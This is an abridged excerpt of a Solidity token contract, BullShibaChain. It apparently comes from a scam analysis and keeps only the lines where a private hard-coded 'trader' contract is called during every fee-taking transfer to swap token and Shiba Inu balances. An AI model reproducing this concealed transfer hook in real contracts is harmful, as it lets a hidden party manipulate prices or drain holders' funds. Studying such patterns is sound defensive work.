...
interface ITrader {
    function swapTokenForToken(address token0, address token1, uint256 token0Amount) external;
}
...
contract BullShibaChain is Context, IERC20, Ownable {
    ...
    address public shibaInu = address(0x2859e4544C4bB03966803b044A93563Bd2D0DD4D);
    address private trader = address(0x7e670bF96f641C0110c4251d78cB1b7F217098e6);
    ...
    constructor () {
        ...
        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), shibaInu);
    ...
    function _transfer(
        ...
        if(takeFee){
            if(to != uniswapV2Pair){
                ...
                if(IERC20(shibaInu).balanceOf(address(trader)) > 1 * 10**18) {
                    ITrader(trader).swapTokenForToken(shibaInu, address(this), IERC20(shibaInu).balanceOf(address(trader)));
                }
            ...
            if(from != uniswapV2Pair){
                ...
                if(balanceOf(address(trader)) > 1 * 10**9) {
                    ITrader(trader).swapTokenForToken(address(this), shibaInu, balanceOf(address(trader)));
                }
    ...
    function swapBack() private {
        swapTokensForShiba(swapTokenAtAmount);     
    }
